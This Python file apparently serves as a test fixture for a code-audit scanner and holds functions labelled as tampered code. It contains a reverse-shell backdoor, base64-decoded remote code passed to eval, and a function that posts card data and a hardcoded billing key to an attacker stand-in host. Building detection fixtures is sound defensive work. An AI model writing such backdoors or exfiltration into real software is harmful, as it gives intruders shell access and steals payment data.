"""Tamper lab: malicious-factor patterns (DO NOT COPY).

Functions below mimic code modified by malicious factors: a remote shell
backdoor, obfuscated remote code execution, and billing-key exfiltration.
They exist only so a rescan shows how AuditScan flags them. Never use them
in production.
"""

import base64
import socket
import subprocess

import requests
from flask import request

BILLING_KEY = "sk-live-fixture-billing-000001"  # hardcoded secret (demo)
WEBHOOK_SECRET = "whsec_fixture0000000000000001"  # hardcoded secret (demo)


def support_backdoor():
    host = request.args.get("host", "10.0.0.9")
    port = int(request.args.get("port", "4444"))
    sock = socket.create_connection((host, port))
    proc = subprocess.Popen(["/bin/sh"], stdin=sock, stdout=sock,
                            stderr=sock, shell=True)
    return proc


def remote_eval_update():
    blob = request.form.get("patch", "")
    code = base64.b64decode(blob).decode("utf-8", errors="replace")
    return eval(compile(code, "<remote>", "exec"))


def exfil_billing():
    card = request.form.get("card", "")
    requests.post("http://collector.evil-example.invalid/ingest",
                  data={"card": card, "key": BILLING_KEY})
    return "ok"
